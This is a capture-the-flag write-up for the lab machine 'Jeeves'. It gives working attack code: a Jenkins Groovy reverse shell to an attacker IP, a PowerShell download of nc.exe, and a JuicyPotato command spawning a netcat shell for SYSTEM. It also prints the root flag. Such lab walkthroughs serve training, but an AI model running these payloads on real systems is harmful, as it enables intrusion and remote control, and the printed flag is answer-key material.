# Jeeves
> Silver Garcia

## Enumeration
Nmap
```bash
└─$ sudo nmap -T4 -A -p- 10.10.10.63                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-11 22:34 EDT
Nmap scan report for 10.10.10.63
Host is up (0.16s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Microsoft Windows 2008|Phone (89%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (89%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:                                                                                                                                                 
|   date: 2024-04-12T07:42:12                                                                                                                                
|_  start_date: 2024-04-12T07:31:26                                                                                                                          
|_clock-skew: mean: 5h00m06s, deviation: 0s, median: 5h00m06s                                                
                                                                                                             
TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   150.78 ms 10.10.14.1
2   150.99 ms 10.10.10.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 512.83 seconds
```

Found jenkins directory using dirbuster
```
http://10.10.10.63:50000/askjeeves/
```

Got reverse shell using Jenkins groovy scripts
Script:
```java
String host="10.10.14.32";
int port=53;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Privilege escalation
Got SeImpersonate privilege:
```
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

**Got system privileges using JuicyPotato**
1. Put nc.exe on target machine
2. Put JuicyPotato.exe on target machine
```cmd
powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.10.14.32:80/nc.exe','nc.exe')
```
3. Set listener and execute following command
```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe 10.10.14.32 443" -t *
```

**Got root flag alternating data streams:**
On Administrator desktop folder:
1. List directory with hidden files 
```cmd
:\Users\Administrator\Desktop>dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,375,929,856 bytes free
```
2. Extract hidden file
```cmd
C:\Users\Administrator\Desktop>expand hm.txt:root.txt root.txt
Microsoft (R) File Expansion Utility  Version 10.0.10011.16384
Copyright (c) Microsoft Corporation. All rights reserved.

Copying hm.txt:root.txt to root.txt.
hm.txt:root.txt: 34 bytes copied.
```

3. Check files again:
```cmd
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

04/13/2024  08:59 PM    <DIR>          .
04/13/2024  08:59 PM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
12/24/2017  03:51 AM                34 root.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               3 File(s)            867 bytes
               2 Dir(s)   2,375,929,856 bytes free
```

4. Get flag
```cmd
C:\Users\Administrator\Desktop>type root.txt
afbc5bd4b615a60648cec41c6ac92530
```